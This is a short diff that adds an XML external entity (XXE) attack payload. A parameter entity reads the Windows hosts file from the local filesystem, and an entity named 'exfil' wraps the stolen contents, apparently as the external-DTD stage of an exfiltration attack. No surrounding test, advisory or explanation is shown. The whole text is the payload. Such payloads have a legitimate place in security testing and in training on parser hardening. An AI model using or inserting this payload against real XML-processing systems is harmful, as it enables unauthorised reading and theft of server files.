@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
+<!ENTITY exfil "%data;">
